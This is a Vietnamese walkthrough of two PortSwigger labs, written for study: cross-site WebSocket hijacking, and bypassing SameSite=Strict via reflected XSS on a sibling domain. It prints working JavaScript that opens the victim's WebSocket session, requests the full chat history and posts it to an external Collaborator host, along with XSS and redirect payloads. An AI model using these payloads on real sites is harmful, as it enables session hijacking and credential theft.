🧪 **Lab: Cross-site WebSocket Hijacking (PortSwigger)**

🔗 **Lab URL: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab**

🧠 **Phân tích kỹ thuật đề bài**
Ứng dụng là một cửa hàng trực tuyến có tích hợp tính năng live chat sử dụng WebSocket để truyền và nhận tin nhắn theo thời gian thực.

✅ **Điểm yếu bảo mật:**

WebSocket không yêu cầu CSRF token khi handshake.

Cookie phiên của người dùng vẫn được gửi trong quá trình WebSocket handshake từ bất kỳ origin nào.

Cho phép kẻ tấn công tạo một script độc hại khiến trình duyệt của nạn nhân tự động kết nối lại WebSocket bằng session hợp lệ của họ.

🧩 **Mục tiêu**

Sử dụng tính năng Exploit Server để gửi một trang HTML chứa script khai thác đến nạn nhân, đánh cắp lịch sử chat của họ. Trong đó có chứa username và password, từ đó đăng nhập và hoàn thành lab.

🔍 **Bước 1: Quan sát hoạt động của WebSocket**

Truy cập lab, nhấn vào "Live chat".

Gửi một tin nhắn bất kỳ.

Reload lại trang.

Mở Burp Suite → Proxy → WebSockets history:

Quan sát thấy client gửi chuỗi "READY" → server phản hồi bằng toàn bộ lịch sử tin nhắn.

Đây là chuỗi quan trọng mà attacker cần gửi để server gửi lịch sử về.

![image](https://github.com/user-attachments/assets/437785b0-5ee3-458e-bb29-22600978b071)

Mở Burp → Proxy → HTTP history:

Tìm yêu cầu handshake WebSocket (thường là GET /chat với Upgrade: websocket).

Kiểm tra và xác nhận: không có CSRF token trong header.

![image](https://github.com/user-attachments/assets/34d82764-0e63-4957-bb6c-d0cf4d3121c8)

💥 **Bước 2: Khai thác bằng JavaScript**

Truy cập Exploit Server, dán đoạn script sau vào phần Body của payload:

<script>
    var ws = new WebSocket('wss://<your-lab-id>.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<your-collaborator-id>.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
🔧 Lưu ý:

Thay <your-lab-id> bằng lab ID của bạn (copy từ yêu cầu handshake WebSocket).

Thay <your-collaborator-id> bằng Burp Collaborator payload.

🔁 **Quy trình khai thác**

Nạn nhân truy cập trang exploit.

Script chạy trên trình duyệt của nạn nhân.

Trình duyệt tự động mở WebSocket đến /chat với cookie hợp lệ.

Gửi "READY" → nhận toàn bộ lịch sử chat.

Từng tin nhắn được gửi về máy chủ attacker (qua Burp Collaborator).

Attacker thu được thông tin đăng nhập trong nội dung chat.

![image](https://github.com/user-attachments/assets/f2ac2644-962b-47b0-9372-d0ee47e0545f)

🧩 **Bước 3: Đăng nhập và hoàn thành Lab**

Mở Burp → Collaborator tab → Poll now.

Kiểm tra các request chứa lịch sử chat → tìm username và password.

Dùng thông tin đó để đăng nhập và hoàn thành lab.

✅ **Kết luận**

Lỗi WebSocket hijacking xảy ra khi:

WebSocket không kiểm tra Origin hoặc CSRF token.

Trình duyệt gửi cookie tự động trong kết nối WebSocket → cho phép trang bên ngoài "hijack" session hiện tại.

🧪 **Lab: SameSite Strict bypass via sibling domain**
🔗 **Lab URL: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain**
🧠 **Mục tiêu**

Khai thác lỗ hổng Cross-site WebSocket Hijacking (CSWSH) và vượt qua cơ chế bảo vệ SameSite=Strict bằng cách sử dụng XSS từ domain anh em (cms-...) để đánh cắp lịch sử chat chứa thông tin đăng nhập nạn nhân.

🕵️‍♂️ **Phân tích kỹ thuật**

Ứng dụng có tính năng chat sử dụng WebSocket (/chat).

WebSocket không có CSRF token trong handshake → có thể bị chiếm quyền nếu vượt qua được SameSite cookie.

Cookie của ứng dụng được gán SameSite=Strict → chặn truy cập từ cross-site.

Tuy nhiên, domain cms-... là sibling domain trong cùng một "site" → không bị SameSite chặn.

cms-... chứa lỗ hổng reflected XSS trong form /login.
🧰 **Bước 1: Xác định XSS ở sibling domain**

Trong Burp Proxy, gửi yêu cầu đến một file JS/image → thấy header:
![image](https://github.com/user-attachments/assets/07117940-cc20-44b2-954c-202ec73e0861)
Truy cập domain đó → thấy form đăng nhập.

Gửi payload:

<script>alert(1)</script>

![image](https://github.com/user-attachments/assets/3c8f6d59-8f72-4270-a4b5-c6836b91dfad)

 => xác nhận có reflected XSS.

 Copy URL chứa payload XSS để sử dụng cho tấn công CSWSH(cross site websocket hijacking).

📡 **Bước 2: Viết script tấn công WebSocket**

<script>
    
    var ws = new WebSocket('wss://<your-lab-id>.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<your-collaborator>.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
    
</script>


URL-encode toàn bộ script trên → dán vào URL cms-.../login?username=....

Tạo script chuyển hướng người dùng sang URL XSS:

<script>
    
    document.location = "https://cms-<lab-id>.web-security-academy.net/login?username=<payload-encoded>&password=anything";
    
</script>

![image](https://github.com/user-attachments/assets/22dcb625-d9e4-491d-be1e-8ff3a50f943f)

🎯 **MỤC ĐÍCH:**

Khởi tạo kết nối WebSocket từ trình duyệt nạn nhân đến server chat, sử dụng session cookie của nạn nhân.

Gửi lệnh "READY" đến server, khiến nó phản hồi toàn bộ lịch sử chat (chứa tên đăng nhập và mật khẩu).

Gửi dữ liệu lịch sử chat đó ra ngoài, về máy chủ của kẻ tấn công (thông qua Burp Collaborator).

Do SameSite=Strict ngăn chặn gửi cookie khi truy cập từ một site khác, nên:

XSS trên sibling domain (cms-...) được dùng để thực thi JavaScript trong cùng "site" → cookie được gửi đúng cách → bypass thành công SameSite Strict.

✅ **Kết quả:**

Khi người dùng (nạn nhân) truy cập URL chứa XSS trong username, trình duyệt của họ:

Chạy script tấn công WebSocket (gửi "READY" → nhận chat history).

Do chạy từ cùng site, cookie được gửi theo.

Chat history chứa username/password → được gửi về attacker.
